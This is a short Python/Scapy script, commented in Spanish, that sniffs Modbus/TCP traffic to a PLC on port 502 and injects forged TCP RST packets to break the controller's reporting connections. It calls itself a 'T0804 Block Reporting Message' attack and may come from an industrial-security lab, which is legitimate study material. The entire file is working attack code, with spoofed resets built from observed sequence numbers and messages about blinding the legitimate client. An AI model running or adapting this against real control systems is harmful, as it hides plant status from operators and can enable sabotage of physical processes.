from scapy.all import sniff, send, IP, TCP

PLC_IP = "192.168.70.129"

def inyectar_rst(pkt):
    # Verificamos que el paquete tiene capa IP y TCP
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        # Ignoramos paquetes que ya sean SYN o RST
        if pkt[TCP].flags == "S" or pkt[TCP].flags == "R":
            return
            
        print(f"[!] Reporte detectado de {pkt[IP].src} a {pkt[IP].dst}")
        print("[!] Inyectando paquete TCP RST (Reset) falsificado para interrumpir el reporte...")
        
        # Construimos el paquete asesino (RST). Intercambiamos origen/destino 
        # y usamos el 'ack' actual como nuestro número de secuencia ('seq') para que 
        # el receptor crea que es un paquete legítimo y cierre la conexión de golpe.
        rst_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                  TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack)
        
        send(rst_pkt, verbose=0)
        print("[+] Enlace destruido. El cliente legítimo ha sido cegado (Block Reporting).")

if __name__ == "__main__":
    print("[*] Iniciando ataque T0804 (Block Reporting Message)...")
    print("[*] Escuchando tráfico industrial en el puerto 502...")
    # Sniffamos unos cuantos paquetes legítimos y disparamos los RST
    sniff(filter=f"host {PLC_IP} and tcp port 502", prn=inyectar_rst, count=4)
    print("[*] Ataque finalizado. Conexiones saboteadas.")
